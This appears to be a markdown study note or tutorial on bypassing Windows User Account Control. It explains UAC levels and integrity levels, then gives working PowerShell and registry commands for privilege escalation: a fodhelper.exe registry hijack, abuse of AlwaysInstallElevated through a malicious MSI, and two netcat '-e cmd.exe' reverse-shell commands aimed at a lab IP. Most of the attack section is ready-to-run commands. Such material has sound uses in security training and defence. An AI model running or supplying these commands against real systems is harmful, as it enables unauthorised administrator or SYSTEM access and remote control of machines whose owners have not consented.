
---
# User Account Control (UAC) Bypass**

UAC bypass techniques allow attackers to run programs with **administrator** privileges without showing a security prompt.

## **1. What is User Account Control (UAC)?**

UAC is a Windows security feature that prevents programs from running with administrator rights unless the user **approves** it.

When an app needs admin access, UAC shows a **popup** asking for permission.

👉 **Example:**

- If you open **Command Prompt** normally, it runs with **regular user permissions**.
    
- If you right-click and select **"Run as Administrator"**, UAC asks for confirmation, and then it runs with **higher privileges**.
    

### **UAC Security Levels (1-5)**

Windows has different UAC security levels:

```
0 → No prompt (Least secure)  
1 → Ask for credentials on a secure screen  
2 → Ask for approval on a secure screen  
3 → Ask for credentials on a normal screen  
4 → Ask for approval on a normal screen  
5 → Only ask for approval for non-Windows programs  
```

📌 **Secure Desktop**: Blocks other programs from interfering with the UAC popup (Level 1 & 2).  
📌 **Normal Desktop**: Allows other apps to interact with the popup (Less secure - Level 3 & 4).

---

## **2. What is Mandatory Integrity Control (MIC)?**

MIC is a security system that controls **which process can interact with others** based on **integrity levels**.

Windows has 4 integrity levels:

- **Low** → Used by browsers & sandboxes.
    
- **Medium** → Regular apps & users (default).
    
- **High** → Administrator-level access.
    
- **System** → Highest level (used by OS).
    

👉 **How MIC & UAC work together:**

- **MIC** enforces rules about which apps can access what.
    
- **UAC** decides when and how to grant admin rights.
    

---

## **3. How to Check UAC Configuration**

To see if UAC is **enabled**:

```powershell
PS C:\> Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
```

- If the value is **1**, UAC is enabled.
    
- If it's **0**, UAC is disabled.
    

To check the **UAC level**:

```powershell
PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
```

- If the value is **0**, UAC is set to the lowest level (no prompts).
    
- Higher values mean stricter security.
    

To **change UAC level**, use:

```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
```

This sets UAC to **Level 2** (prompt for consent on secure desktop).

---

## **4. How to Bypass UAC?**

Some Windows programs **automatically get admin rights** without showing a UAC popup.  
Attackers can **exploit** this to gain admin privileges.

### **4.1 Check if a Program Auto-Elevates (sigcheck.exe)**

To see if a program **auto-elevates**, use **sigcheck.exe**:

```powershell
.\Sigcheck\sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

If the **Manifest** file contains:

```xml
<trustInfo>
   <security>
       <requestedPrivileges>
           <requestedExecutionLevel level="requireAdministrator"/>
       </requestedPrivileges>
   </security>
</trustInfo>
<asmv3:windowsSettings>
   <autoElevate>true</autoElevate>
</asmv3:windowsSettings>
```

This means the program runs with **admin rights automatically**.

---

## **5. UAC Bypass Techniques**

### **5.1 Level 0 - Easiest Method**

If UAC is at **Level 0**, no security check is needed.  
You can directly run a program with **high privileges**:

```powershell
Start-Process -FilePath "C:\Users\Quickemu\Downloads\nc64.exe" -ArgumentList "192.168.122.1 4321 -e cmd.exe" -Verb RunAs -WindowStyle Hidden
```

This runs **nc64.exe** (Netcat) as admin.

🔹 **Why does this work?**  
Because in **Level 0**, Windows doesn’t ask for confirmation before running admin commands.

---

### **5.2 Level 5 - Bypass Using `fodhelper.exe`**

UAC **Level 5** only asks for permission for **non-Windows** programs.  
Some **Windows programs (like `fodhelper.exe`) auto-run as admin**.

**Steps to Exploit:** 1️⃣ **Create a malicious registry entry:**

```powershell
New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Type String
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String
```

This sets `cmd.exe` to **run as administrator** when `fodhelper.exe` starts.

2️⃣ **Trigger the attack:**

```powershell
C:\Windows\System32\fodhelper.exe
```

Since `fodhelper.exe` is **trusted**, Windows runs it with **high integrity**, which **launches cmd.exe as admin**!

🔥 **Full Exploit for a Reverse Shell:**

```powershell
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
C:\Windows\System32\fodhelper.exe
```

This **bypasses UAC and opens a remote shell**.

---

### **5.3 Levels 1-4 - `Always Install Elevated`**

Windows has an **"Always Install Elevated"** policy that allows **MSI installers** to run as **SYSTEM** (the highest privilege).

#### **Check if it's enabled:**

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both values are **1**, then you can install **MSI files** as SYSTEM!

#### **Exploit it:**

1️⃣ **Create a malicious MSI package**  
2️⃣ **Run it as SYSTEM:**

```powershell
msiexec /quiet /qn /i sample2.msi
```

This **completely bypasses UAC** and runs the installer with **SYSTEM privileges**.

---

## **6. References**

📚 **Hack Tricks - UAC Bypass**  
🔗 [https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control](https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control)

📚 **Fodhelper UAC Bypass**  
🔗 [https://nadimsaliby.medium.com/by-pass-uac-using-fodhelper-e4a94e04d5f0](https://nadimsaliby.medium.com/by-pass-uac-using-fodhelper-e4a94e04d5f0)

---
